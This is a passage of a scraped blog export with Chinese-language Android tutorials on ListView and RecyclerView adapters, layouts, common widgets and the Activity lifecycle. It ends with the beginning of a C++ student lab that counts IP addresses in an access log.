实现过程：新建适配器-&gt;添加数据源到适配器-&gt;视图加载适配器 Android中提供了很多适配器的实现类，这次使用的是ArrayAdapter，可以通过泛型来指定要适配的数据类型，然后再构造函数中把要适配的数据传入。ArrayAdapter有多个构造函数重载，由与我们提供的数据都为字符串，所有泛型指定为String，然后再ArrayAdapter的构造函数中依次传入 当前的上下文、ListView的子项布局的id 以及要适配的数据 这里使用了android.R.layout.simple_list_item_1作为ListView子项布局的id，这是一个Android内置的布局文件，里面只有一个TexView，可用于显示一段文本，这样适配器的对象就构建好了 最后，通过调用ListView的setAdapter( )方法，将构建好的适配器对象传递进去，这样ListView和数据之间的关联就建立完成 2.定制ListView界面实现原理：通过创建一个自定义类，类似于String类型，然后对这个自定义类进行一个布局文件的创建，这个布局文件主要用在建立一个适配器的排列方式，然后建立一个基于ArrayAdapter的一个派生类，重写里面的构造函数以及getView( )函数 定义一个实体类，作为ListView适配器的适配类型，新建hero hero.java代码如下： 123456789101112131415package com.example.listviewtest;public class hero &#123; private String name; private int imageid; public hero(String name,int imageid)&#123; this.name=name; this.imageid=imageid; &#125; public String getName()&#123; return name; &#125; public int getImageid()&#123; return imageid; &#125;&#125; 需要为ListView的每一个子项指定一个布局文件，新建hero_item.xml 代码如下： 1234567891011121314151617181920&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;&gt; &lt;LinearLayout android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot;&gt; &lt;ImageView android:id=&quot;@+id/hero_image&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot;/&gt; &lt;TextView android:id=&quot;@+id/hero_name&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_gravity=&quot;center_vertical&quot; android:layout_marginLeft=&quot;10dp&quot; /&gt; &lt;/LinearLayout&gt;&lt;/androidx.constraintlayout.widget.ConstraintLayout&gt; 在这个布局中主要定义的是一个ImageView用于去显示英雄的图片，而且定义了一个TextView用于显示英雄的名称，并且让TextView在垂直方向上居中显示 接下来类似于上面的泛型适配器，需要自定义一个适配器，能容纳hero这个类的，新建HeroAdapter.java 12345678910111213141516171819public class HeroAdapter extends ArrayAdapter&lt;hero&gt; &#123; private int resouceId; public HeroAdapter(Context context, int textViewResouceId, List&lt;hero&gt; objects)&#123; super(context,textViewResouceId,objects); resouceId=textViewResouceId; &#125; @Override public View getView(int position, View converView, ViewGroup patrent)&#123; hero hero_temp=getItem(position); View view= LayoutInflater.from(getContext()).inflate(resouceId,patrent,false); ImageView heroImage=(ImageView)view.findViewById(R.id.hero_image); TextView heroName=(TextView) view.findViewById(R.id.hero_name); heroImage.setImageResource(hero_temp.getImageid()); heroName.setText(hero_temp.getName()); return view; &#125; &#125; public HeroAdapter(Context context, int textViewResouceId, List&lt;hero&gt; objects)重写了父类的一组构造函数，将上下文，ListView子项的布局的id和数据。 另外重写了getView( )方法，首先通过getItem方法得到当前的hero实例，然后使用LayoutInflater.from(getContext()).inflate(resouceId,patrent,false)加载传入布局 调用View的findViewId( )获取到Image View和TextView实例， 用下列语句 12heroImage.setImageResource(hero_temp.getImageid());heroName.setText(hero_temp.getName()); 显示图片和文字，最后将布局返回，这样自定义的适配器就完成 最后再MainActivity中的代码： 1234567891011121314151617181920212223242526272829public class MainActivity extends AppCompatActivity &#123; private List&lt;hero&gt; herolist=new ArrayList&lt;&gt;(); @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); //为列表中添数据 inithero(); //通过列表中的数据添加一个适配器 HeroAdapter adapter=new HeroAdapter(MainActivity.this,R.layout.fruit_item,herolist); ListView listView=(ListView) findViewById(R.id.list_view); listView.setAdapter(adapter); &#125; private void inithero()&#123; for(int i=0;i&lt;2;i++)&#123; hero anni=new hero(&quot;安妮&quot;,R.drawable.anni); herolist.add(anni); hero lunzima=new hero(&quot;轮子妈&quot;,R.drawable.lunzima); herolist.add(lunzima); hero nvqiang=new hero(&quot;女枪&quot;,R.drawable.nvqiang); herolist.add(nvqiang); hero xiazi=new hero(&quot;瞎子&quot;,R.drawable.xiazi); herolist.add(xiazi); hero timo=new hero(&quot;提莫&quot;,R.drawable.timo); herolist.add(timo); &#125; &#125;&#125; 首先用intihero( )去初始所有的英雄,将hero的构造函数将水果和图片id传入，然后把创建好的对象添加到水果列表中，接着onCreate( )方法创建了HeroAdapter对象，最后将adapter作为适配器传给ListView 这样就完成 3.提升ListView运行速率123456View view;if(converView==null)&#123; view= LayoutInflater.from(getContext()).inflate(resouceId,patrent,false);&#125;else&#123; view=converView;&#125; 其中在getView( )方法进行了判断，如果converView为null，则使用LayoutInflater去加载布局，如果不为null则直接对convertView进行重用，这样提高了ListView的运行效率。最重要使用了view=converView 4.ListView点击事件1234567891011121314151617protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); inithero(); HeroAdapter adapter=new HeroAdapter(MainActivity.this,R.layout.fruit_item,herolist); ListView listView=(ListView) findViewById(R.id.list_view); listView.setAdapter(adapter); listView.setOnItemClickListener(new AdapterView.OnItemClickListener() &#123; @Override public void onItemClick(AdapterView&lt;?&gt; parent, View view, int position, long id) &#123; //获得列表中他的位置 hero hero_temp=herolist.get(position); Toast.makeText(MainActivity.this,hero_temp.getName(),Toast.LENGTH_SHORT).show(); &#125; &#125;);&#125; 使用了listView.setOnItemClickListener( )设置了一个监听器，当用户点击了ListView任何一个子项时，就会回调onItemClick( )方法，在这个方法中可以通过position参数判断出用户点击的是哪一个子项，然后获得相应的结果。 5.RecycleView的基本用法和百分比布局类似，RecycleView也属于新增的控件，为了让RecyclerView在所有Android版本上都能使用，将RecycleVuew定义在了support库中，因此，想要RecycleView这个控件，首先需要在项目的build.gradle添加相应的依赖库 打开app/build.gradle文件，在dependencies闭包中添加入下内容: 1compile &#x27;com.android.support:recyclerview-v7:24.2.1&#x27; 接下来需要为RecyclerView准备一个适配器，新建heroAdapter类，让这个适配器继承自RecycleView.Adapter，并泛型指定为HeroAdapter.ViewHolder，其中，HeroAdapter.ViewHolder是在heroAdapter中定义的一个内部类： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package com.example.listviewtest;import android.content.Context;import android.view.LayoutInflater;import android.view.View;import android.view.ViewGroup;import android.widget.ArrayAdapter;import android.widget.ImageView;import android.widget.TextView;import androidx.recyclerview.widget.RecyclerView;import java.util.List;import java.util.concurrent.TimeoutException;public class HeroAdapter extends RecyclerView.Adapter&lt;HeroAdapter.ViewHolder&gt;&#123; private List&lt;hero&gt; mheroLsit; static class ViewHolder extends RecyclerView.ViewHolder&#123; ImageView heroImage; TextView heroname; public ViewHolder(View view)&#123; super(view); heroImage=(ImageView) view.findViewById(R.id.hero_image); heroname=(TextView) view.findViewById(R.id.hero_name); &#125; &#125; public HeroAdapter(List&lt;hero&gt; heroList)&#123; mheroLsit=heroList; &#125; @Override public ViewHolder onCreateViewHolder(ViewGroup parent,int ViewType)&#123; View view=LayoutInflater.from(parent.getContext()).inflate(R.layout.fruit_item,parent,false); ViewHolder holder=new ViewHolder(view); return holder; &#125; @Override public void onBindViewHolder(ViewHolder holder,int position)&#123; hero hero_temp=mheroLsit.get(position); holder.heroImage.setImageResource(hero_temp.getImageid()); holder.heroname.setText(hero_temp.getName()); &#125; @Override public int getItemCount()&#123; return mheroLsit.size(); &#125;&#125; 123456789static class ViewHolder extends RecyclerView.ViewHolder&#123; ImageView heroImage; TextView heroname; public ViewHolder(View view)&#123; super(view); heroImage=(ImageView) view.findViewById(R.id.hero_image); heroname=(TextView) view.findViewById(R.id.hero_name); &#125; &#125; 首先定义了一个内部类ViewHolder，ViewHolder要继承自RecycleView.ViewHolder。然后ViewHolder的构造函数中要传入一个View参数，这个参数通常是RecycleView子项的最外层布局，最后可以通过findViewById( )方法来获取布局中的ImageView和TextView( )的实例 由于HeroAdapter是继承自RecyclerView.Adapter的，那就必须重写其中的三个方法 public ViewHolder onCreateViewHolder( )用于创建一个ViewHolder实例，并把加载出来的布局传入到构造函数当中，最后将的实例返回。 public void onBindViewHolder( )方法适用于对RecyclerView子项的数据进行赋值，会在每个子项被滚动到屏幕内的时候执行，这里我们通过position参数得到当前项的hero实例，然后将数据设置到ViewHolder的ImageView和TextView当中。 public int getItemCount( )用于告诉RecyclerView一共有多少子项，直接放回数据源的长度 6.RecycleView的点击事件","categories":[],"tags":[{"name":"Android","slug":"Android","permalink":"http://example.com/tags/Android/"}]},{"title":"Android-基本布局","slug":"Android/Android-基本布局","date":"2020-09-22T11:17:07.000Z","updated":"2021-04-01T13:51:58.000Z","comments":true,"path":"2020/09/22/Android/Android-基本布局/","link":"","permalink":"http://example.com/2020/09/22/Android/Android-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/","excerpt":"","text":"线性布局LinearLayout又称为线性布局，所包含的控件在线性方向上依次排列，之前通过android:orientation=&quot;vertical&quot;表明了排列方向是vertical即是垂直排列。如果指定的是horizontal，控件就会在水平方向上排列 垂直排列 1234567891011121314151617181920&lt;LinearLayout android:orientation=&quot;vertical&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;&gt; &lt;Button android:id=&quot;@+id/button1&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;button&quot; /&gt; &lt;Button android:id=&quot;@+id/button2&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;button&quot; /&gt; &lt;Button android:id=&quot;@+id/button3&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;button&quot; /&gt;&lt;/LinearLayout&gt; 垂直排列 修改android:orientation=&quot;vertical&quot;为android:orientation=&quot;horizontal&quot; 水平排列 区分android:layout_gravity与android:gravityandroid:layout_gravity 用于指定控件在布局中的对齐方式 android:gravity指定文字在控件中的对齐方式 当排列方向是horizontal时，只有垂直方向上的对齐方式才会生效，水平方向上的长度是不固定的，每添加一个控件，水平方向上的长度都会发生改变，因而无法指定该方向上的对齐方式。 当排列方向是vertical时，只要垂直方向上的对齐方式才会生效。 123android:layout_gravity=&quot;top&quot;android:layout_gravity=&quot;center_vertical&quot;android:layout_gravity=&quot;bottom&quot; Layout_weight对于该属性允许使用比例方式来指定控件的大小，在手机屏幕的适配性方面可以起到非常重要的作用。 123456789101112131415161718&lt;LinearLayout android:orientation=&quot;horizontal&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;&gt; &lt;EditText android:id=&quot;@+id/input_message&quot; android:layout_width=&quot;0dp&quot; android:layout_height=&quot;wrap_content&quot; android:layout_weight=&quot;1&quot; /&gt; &lt;Button android:id=&quot;@+id/send&quot; android:layout_width=&quot;0dp&quot; android:layout_height=&quot;wrap_content&quot; android:layout_weight=&quot;1&quot; android:text=&quot;发送文件&quot; /&gt;&lt;/LinearLayout&gt; 可以看到其中的 android:layout_width=&quot;0dp&quot;，但是由于使用了 android:layout_weight=&quot;1&quot;属性后，此时的控件长度由androi:layout_weight属性，此时的控件宽度就不应该由前面来控制 此时可以看到属性值设置为1，表示EditText和Button在水平方向上平分宽度 上图是将button的layout_weight改为”wrap_content” 相对布局12345678910111213141516171819202122232425262728293031323334353637383940&lt;RelativeLayout android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;&gt; &lt;Button android:id=&quot;@+id/button1&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;按钮1&quot; android:layout_alignParentLeft=&quot;true&quot; android:layout_alignParentTop=&quot;true&quot;/&gt; &lt;Button android:id=&quot;@+id/button2&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;按钮2&quot; android:layout_alignParentRight=&quot;true&quot; android:layout_alignParentTop=&quot;true&quot;/&gt; &lt;Button android:id=&quot;@+id/button3&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;按钮3&quot; android:layout_alignParentLeft=&quot;true&quot; android:layout_alignParentBottom=&quot;true&quot;/&gt; &lt;Button android:id=&quot;@+id/button4&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;按钮4&quot; android:layout_alignParentRight=&quot;true&quot; android:layout_alignParentBottom=&quot;true&quot;/&gt; &lt;Button android:id=&quot;@+id/button5&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;按钮5&quot; android:layout_centerInParent=&quot;true&quot; /&gt; &lt;/RelativeLayout&gt; 上面控件都是相对于父布局进行定位，同时控件可以相对于控件进行一个定位 123456789101112131415161718192021222324252627282930313233343536&lt;Button android:id=&quot;@+id/button1&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;按钮1&quot; android:layout_above=&quot;@id/button5&quot; android:layout_toLeftOf=&quot;@id/button5&quot;/&gt;&lt;Button android:id=&quot;@+id/button2&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;按钮2&quot; android:layout_above=&quot;@id/button5&quot; android:layout_toRightOf=&quot;@id/button5&quot;/&gt;&lt;Button android:id=&quot;@+id/button3&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;按钮3&quot; android:layout_below=&quot;@id/button5&quot; android:layout_toLeftOf=&quot;@id/button5&quot;/&gt;&lt;Button android:id=&quot;@+id/button4&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;按钮4&quot; android:layout_below=&quot;@id/button5&quot; android:layout_toRightOf=&quot;@id/button5&quot;/&gt;&lt;Button android:id=&quot;@+id/button5&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;按钮5&quot; android:layout_centerInParent=&quot;true&quot; /&gt; android:layout_above=&quot;@id/button5&quot;使得该控件位于button5上方 android:layout_below=&quot;@id/button5&quot;使得该控件位于button5下方 android:layout_toLeftOf=&quot;@id/button5&quot;使得该控件位于button5左侧 android:layout_toRightOf=&quot;@id/button5&quot;使得该控件位于button5右侧 3.帧布局FrameLayout所有的控件都会默认摆放在布局的左上角 4.百分比布局PrecentFrameLayout 和PrecentRelativeLayout两个布局 需要在项目的build.gradle中添加百分比布局的依赖，就能保证百分比布局在Android所有系统版本上的兼容性 5.引入布局在一个布局中引入替他布局 1&lt;include layout=&quot;@layout/titile&quot;/&gt; 6.创建自定义控件引入布局文件确实解决了重复编写布局代码的问题，但是如果布局中有一些控件要求能够响应时间，我们还是需要在每一个活动中为这些控件单独编写一次事件注册代码，比如标题栏中的返回按钮，其实不管在哪一个活动中，这个按钮的功能都是相同的，即销毁当前活动，而如果在每一次活动中都需要重新注册一遍返回按钮的点击事件，无疑会增加很多重复的代码，这种情况最好是使用自定义控件的方式进行解决。 新建TitleLayout这和类继承自LinearLayout，让其成为我们自定义的标题栏控件 123456789101112131415161718192021public class TitleLayout extends LinearLayout &#123; public TitleLayout(Context context, AttributeSet attrs)&#123; super(context,attrs); LayoutInflater.from(context).inflate(R.layout.titile,this); Button titileBack=(Button) findViewById(R.id.title_bcak); Button titileEdit=(Button) findViewById(R.id.title_edit); titileBack.setOnClickListener(new OnClickListener() &#123; @Override public void onClick(View v) &#123; ((Activity)getContext()).finish(); &#125; &#125;); titileEdit.setOnClickListener(new OnClickListener() &#123; @Override public void onClick(View v) &#123; Toast.makeText(getContext(),&quot;你正在点击编辑键&quot;,Toast.LENGTH_LONG).show(); &#125; &#125;); &#125;&#125; 重写了构造函数，public TitleLayout(Context context, AttributeSet attrs)，在布局中引入该控件就会调用这个构造函数。然后在构造函数中需要对标题栏布局进行动态加载，需要语句 1LayoutInflater.from(context).inflate(R.layout.titile,this); 通过LayoutIlater的from( )方法可以构建出一个LayoutInflater对象，然后调用inflate( )方法就可以动态加载一个布局文件。 inflate( )方法有两个参数，一个参数是传入布局文件的id，另一个是给加载好得布局再添加一个父布局，由于这个要指定TitleLayout，于是直接传入this 在activity_main.xml加入自定义的控件： 1234567&lt;LinearLayout android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot;&gt; &lt;com.example.uiwidgettest.TitleLayout android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot;/&gt;&lt;/LinearLayout&gt;","categories":[{"name":"Android","slug":"Android","permalink":"http://example.com/categories/Android/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://example.com/tags/Android/"}]},{"title":"Android-控件使用","slug":"Android/Android-控件使用","date":"2020-09-22T05:50:15.000Z","updated":"2021-04-01T13:55:28.000Z","comments":true,"path":"2020/09/22/Android/Android-控件使用/","link":"","permalink":"http://example.com/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/","excerpt":"","text":"TextView123456789&lt;LinearLayout android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;&gt; &lt;TextView android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;床前明月光&quot; android:gravity=&quot;center&quot; /&gt; &lt;/LinearLayout&gt; android:layout_width android:layout_height指定了控件的宽度和高度 所有的Android控件都具有这两个属性，可选值有match_parent、fill_parent、wrap_content 其中match_parent和fill_parent的意义相同，都是让控件的大小和父布局的大小一样 wrap_content表示当前的控件的大小刚好能够包含住里面的内容，就是由控件的内容决定当前控件的大小 android:gravity用来指定文字的对其方式，可选值有top、bottom、left、right、center可以用|来指定多个值。 这里的center，效果等同于center_vertical|center_horizontal，表示文字在垂直和水平方向都居中对齐 同时可以用android:textSize和android:textColor属性对字体的大小和颜色进行更改，字体大小用sp作为单位 Button123456789&lt;LinearLayout android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;&gt; &lt;Button android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;button&quot; android:layout_gravity=&quot;center&quot;/&gt; &lt;/LinearLayout&gt; 可以看到其中 text代码中式button，到了按钮中就变为BUTTON，可以通过android:textALLCap=“false”去取消大写 在java为按钮添加点击事件： 1234567891011protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button button1=(Button) findViewById(R.id.button1); button1.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; Toast.makeText(MainActivity.this,&quot;你按下了这个按钮&quot;,Toast.LENGTH_LONG).show(); &#125; &#125;);&#125; 可以看到为Button1的点击事件注册一个监听器，每次点击按钮，都会执行监听器的onClick( )方法，只需要在这个方法加入处理的逻辑 也可以通过实现接口的方法来进行注册，代码如下： 1234567891011121314151617public class MainActivity extends AppCompatActivity implements View.OnClickListener&#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button button1=(Button) findViewById(R.id.button1); button1.setOnClickListener(this); &#125; @Override public void onClick(View v)&#123; switch (v.getId())&#123; case R.id.button1: Toast.makeText(MainActivity.this,&quot;你点了这个按钮&quot;,Toast.LENGTH_LONG).show(); break; &#125; &#125;&#125; EditText1234567891011121314151617181920&lt;LinearLayout android:orientation=&quot;vertical&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;&gt; &lt;TextView android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;这是一个标签&quot; android:id=&quot;@+id/text_view&quot;/&gt; &lt;Button android:id=&quot;@+id/button1&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;button&quot; android:layout_gravity=&quot;center&quot;/&gt; &lt;EditText android:id=&quot;@+id/edit_text&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot;/&gt;&lt;/LinearLayout&gt; 可以使用android:hint=&quot;输入一些东西&quot;在编辑框上显示文字 开业通过android:maxLines控制显示的行数 1234567891011121314protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button button1=(Button) findViewById(R.id.button1); final EditText editText=(EditText)findViewById(R.id.edit_text); button1.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; String data=editText.getText().toString(); Toast.makeText(MainActivity.this,data,Toast.LENGTH_LONG).show(); &#125; &#125;);&#125; 从编辑框获得文本后，用Toast展示出来 &lt;LinearLayout&gt;在这个标签内进行一个线性排列，要记得加入一个android:orientation=&quot;vertical&quot;这样的话是垂直排列下来 ImageView该控件主要用于界面上展示图片，图片一般都是放在drawable开头的目录下 123456&lt;ImageView android:id=&quot;@+id/image_view&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:src=&quot;@drawable/img_1&quot; /&gt; 通过按钮动态修改图片 1234567891011121314protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button button1=(Button) findViewById(R.id.button1); final EditText editText=(EditText)findViewById(R.id.edit_text); final ImageView imageView=(ImageView)findViewById(R.id.image_view); button1.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; imageView.setImageResource(R.drawable.img_2); Toast.makeText(MainActivity.this,&quot;更换图片成功&quot;,Toast.LENGTH_LONG).show(); &#125; &#125;);&#125; ProgressBar载入一个进度条 1234&lt;ProgressBar android:id=&quot;@+id/progeress_bar&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot;/&gt; 使用控件的可见属性，通过android:visibility进行指定，可选值有visible、invisible和gone visible表示控件可见 invisible表示控件不可见，但是仍然占据屏幕大小 而对于gone来说就是不可见而且不占据屏幕的任何大小 用代码来设置gone的话使用的是setVisibility( )方法，可以传入View.VISBLE、View.INVISIBLE和View.GONE三种值 1234567891011121314final ProgressBar progressBar=(ProgressBar) findViewById(R.id.progeress_bar);button1.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; if(progressBar.getVisibility()==View.GONE)&#123; progressBar.setVisibility(View.VISIBLE); Toast.makeText(MainActivity.this,&quot;打开进度条&quot;,Toast.LENGTH_SHORT).show(); &#125;else&#123; progressBar.setVisibility(View.GONE); Toast.makeText(MainActivity.this,&quot;关闭进度条&quot;,Toast.LENGTH_SHORT).show(); &#125; &#125;&#125;); 可以通过更改布局文件改变进度条的样式 123456&lt;ProgressBar android:id=&quot;@+id/progeress_bar&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; style=&quot;?android:attr/progressBarStyleHorizontal&quot; android:max=&quot;100&quot;/&gt; 1234567public void onClick(View v) &#123; //获取当前进度条进度 int progress=progressBar.getProgress(); progress=progress+10; //重新更改进度条的进度 max为100 progressBar.setProgress(progress);&#125; AlertDialog可以使用Dialgo弹出一个对话框，这个对话框是置于所有界面元素值之上的，能够屏蔽掉其他空间的交互能力，因此AlertDialog一般用于提示一些非常重要的内容或者警告信息 1234567891011121314151617181920212223button1.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; AlertDialog.Builder dialog=new AlertDialog.Builder(MainActivity.this); dialog.setTitle(&quot;这是一个警告框&quot;); dialog.setMessage(&quot;重要的事情&quot;); //设置该警告框是否能取消 dialog.setCancelable(false); dialog.setPositiveButton(&quot;OK&quot;, new DialogInterface.OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int which) &#123; &#125; &#125;); dialog.setNegativeButton(&quot;Cancel&quot;, new DialogInterface.OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int which) &#123; &#125; &#125;); dialog.show(); &#125;&#125;); dialog.setPositiveButton( )设置对话框确定按钮点击事件 dialog.setNegativeButton( )设置对话框取消按钮点击事件 最后调用dialog.show( )将对话框显示出来 ProgressDialog进度条框会显示一个进度条，一般用于表示当前的操作比较耗时，让用户耐心地等待，它的用法和AlertDialog比较类似，修改MainActivity中的代码，如图所示： 1234567public void onClick(View v) &#123; ProgressDialog progressDialog=new ProgressDialog(MainActivity.this); progressDialog.setTitle(&quot;这是一个进度条框&quot;); progressDialog.setMessage(&quot;正在加载中··&quot;); progressDialog.setCancelable(false); progressDialog.show();&#125; 可以看到先构造一个ProgressDialog对象，设置标题、内容、可否取消(设置true可以通过back键进行一个取消)的属性，最后调用show( )方法将ProgressDialog显示出来","categories":[{"name":"Android","slug":"Android","permalink":"http://example.com/categories/Android/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://example.com/tags/Android/"}]},{"title":"Android-深入了解Activity","slug":"Android/Android-深入了解Activity","date":"2020-09-21T16:55:22.000Z","updated":"2021-04-01T13:54:48.000Z","comments":true,"path":"2020/09/22/Android/Android-深入了解Activity/","link":"","permalink":"http://example.com/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/","excerpt":"","text":"Activity的生存期onCreate( )onStart( )onResume( )onPause( )onStop( )onDestroy( )onRestart( )2.活动回收当在活动A基础启动B，再次返回A的过程，A可能会被回收。如果A此时被回收，此时不会执行onRestart( )方法，而是会重新执行活动A的onCreate( )方法，所以活动A这种情况下会被重新创建一次。 如果此时A中有临时数据以及状态，这样的话会被系统回收掉，此时必须采用onSaveInstanceState( )回调方法，该方法带有一个Bundle类型的参数。 Bundl提供了一系列的方法用于保存数据，比如可以使用putString( )方法保存字符串，使用putInt( )方法保存整型数据，每个保存方法存入两个参数，第一个参数是键，用于后面从Bundle取值，第二个参数是真正的值 由于onCreate( )方法中，有一个Bundle参数，可以把其中的Bundle参数取出来 活动的启动模式standard是活动默认的启动模式，在不进行显式指定的情况下，所有活动都会自动使用这种启动模式。因此，到目前为止我们写过的所有活动都是使用standard模式，每当启动一个新的活动，它就会在返回栈中，并处于栈顶的位置。对于使用standard模式的活动，系统不会在乎这个活动是否已经在返回栈中存在，每次启动都会创建该活动的一个新例。 singleTop启动模式 singleTask模式 singleInstance模式","categories":[{"name":"Android","slug":"Android","permalink":"http://example.com/categories/Android/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://example.com/tags/Android/"}]},{"title":"数据结构实验-ip题代码","slug":"实验报告/数据结构实验-ip题代码","date":"2020-09-21T10:01:18.000Z","updated":"2021-04-01T14:11:40.000Z","comments":true,"path":"2020/09/21/实验报告/数据结构实验-ip题代码/","link":"","permalink":"http://example.com/2020/09/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AE%9E%E9%AA%8C-ip%E9%A2%98%E4%BB%A3%E7%A0%81/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210#include&lt;iostream&gt;#include&lt;fstream&gt;#include&lt;string&gt;#include &lt;regex&gt;using namespace std;int main() &#123; ifstream aa; aa.open(&quot;access.txt&quot;, ios::in); if (!aa.is_open()) &#123; cout &lt;&lt; &quot;打开文件失败&quot; &lt;&lt; endl; &#125; string buf2; //ip的正则表达式 regex ipPattern(&quot;^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9]).)&#123;3&#125;(25[0-5]|2[0-5][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])&quot;); //定义10个字符指针存第二题ip char** ip = new char* [10]; for (int i = 0; i &lt; 10; i++) ip[i] = new char[20]; //定义100个字符指针存第一题ip char** ip_1= new char* [100]; for (int i = 0; i &lt; 100; i++) ip_1[i] = new char[20]; //定义一个数组存第二次相同ip的数量 int ip_nums[10]; //定义第二题不同ip数量 int ip_num = 0; //定义第一题不同ip数量 int ip_num_1 = 0; //第二题相同ip的数量置为0 memset(ip_nums, 0, sizeof(ip_nums) ); //读取每一行 while (getline(aa, buf2)) &#123; //第一题 string temp1 = &quot;[07/May/2012&quot;; const char* last1 = strstr(buf2.c_str(), temp1.c_str()); if (last1 != NULL) &#123; //cout &lt;&lt; buf2 &lt;&lt; endl; smatch result; regex_search(buf2, result, ipPattern); string matc_ip = result.str(); //若ip_num_1 ip数量组大于1的话 要进入if遍历是否有相同ip 有的话不用添加 没有的话直接添加 //小于1 直接添加 if (ip_num_1 &gt; 0) &#123; int j = 0, same_flag = 0; for (j = 0; j &lt; ip_num_1; j++) &#123; string temp_ip = ip_1[j]; if (strstr(matc_ip.c_str(), temp_ip.c_str())) &#123; same_flag = 1; /* cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;存在有ip相同的&quot; &lt;&lt; ip[j] &lt;&lt; endl; cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;*/; &#125; &#125; if (same_flag == 0) &#123; memcpy(ip_1[ip_num_1++], matc_ip.c_str(), 20); /* cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;赋值完的ip列表&quot; &lt;&lt; endl; for (int k = 0; k &lt; ip_num; k++) &#123; cout &lt;&lt; ip[k] &lt;&lt; endl; &#125; cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;*/ &#125; &#125; else &#123; /* cout &lt;&lt; 